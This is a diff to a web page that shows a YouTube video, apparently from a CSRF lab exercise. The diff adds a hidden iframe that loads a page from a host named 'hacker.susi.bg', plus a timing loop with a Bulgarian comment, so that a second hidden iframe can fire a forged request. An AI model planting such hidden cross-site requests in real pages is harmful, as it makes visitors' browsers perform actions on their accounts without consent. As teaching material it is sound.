@@ -14,6 +14,15 @@
 <body>
 <iframe width="853" height="480" src="https://www.youtube.com/embed/rjpfl3-9HMc" frameborder="0"
         allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe style="display: none" src="http://hacker.susi.bg/csrf/random_dir/random_file.php"></iframe>
+<script>
+    // Добавяме този цикъл, за да има време браузърът да получи отговора от заявката
+    // към http://hacker.susi.bg/csrf/random_dir/random_file.php преди за изпрати
+    // заявка към iframe.html.
+    for (let i = 0; i < 1000; ++i) {
+        console.log("hi");
+    }
+</script>
 <iframe style="display: none" src="iframe.html"></iframe>
 </body>
 </html>
